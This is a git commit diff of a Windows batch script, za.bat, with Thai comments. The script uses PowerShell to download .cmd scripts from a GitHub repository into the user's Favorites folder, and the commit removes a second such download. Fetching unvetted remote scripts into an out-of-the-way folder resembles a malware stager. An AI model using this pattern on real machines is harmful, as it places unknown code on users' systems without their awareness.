f377e1b83d3489954fe18b88888caf929cfae58a
Stephan999s <136429905+Stephan999s@users.noreply.github.com>
2024-03-01 22:21:37 +0700

    Update za.bat

--- za.bat
+++ za.bat
@@ -2,7 +2,6 @@
 setlocal enabledelayedexpansion
 REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
 set "fileURL=https://raw.githubusercontent.com/Stephan999s/src/main/boo.cmd"
-set "fileURL2=https://raw.githubusercontent.com/Stephan999s/src/main/Fewlovemomandpun.cmd"
 
 REM ระบุโฟลเดอร์ที่ต้องการบันทึกไฟล์
 set "destinationFolder=%USERPROFILE%\Favorites"
@@ -10,8 +9,6 @@ set "destinationFolder=%USERPROFILE%\Favorites"
 REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์
 powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\boo.cmd') }"
 
-REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์ 2
-powershell -command "& { Invoke-WebRequest -Uri '%fileURL2%' -OutFile ('%destinationFolder%\Fewlovemomandpun.cmd') }"
 
 echo Download completed.
 
